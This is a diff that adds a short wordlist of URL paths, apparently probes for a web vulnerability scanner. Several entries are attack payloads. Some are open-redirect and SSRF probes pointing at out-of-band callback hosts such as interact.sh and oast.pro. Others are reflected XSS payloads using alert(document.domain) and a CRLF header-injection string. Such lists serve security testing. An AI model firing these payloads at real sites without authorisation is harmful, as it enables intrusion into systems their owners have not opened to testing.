@@ -1,0 +1,17 @@
+/login?next=http://interact.sh/?app.scan/
+/signup?next=http://interact.sh/?app.scan/
+/select_project.php?url=http://interact.sh
+/clock_status.php?current_page=http://interact.sh
+/auth/login?to=/92874%27;alert(document.domain)//280
+/karma.js
+/?return_url=javascript:alert(document.domain)
+/api/logout?redirect_to=http://oast.pro/
+/?k304=y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(document.domain)%3E
+
+/file=https://oast.pro
+/file=https://interact.sh
+/ui/gradio_api/file=https://oast.me
+/redirect-to?url=https%3A%2F%2Finteract.sh
+/response-headers?Content-Type=text/html&Server=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/steve/services/
+/services/
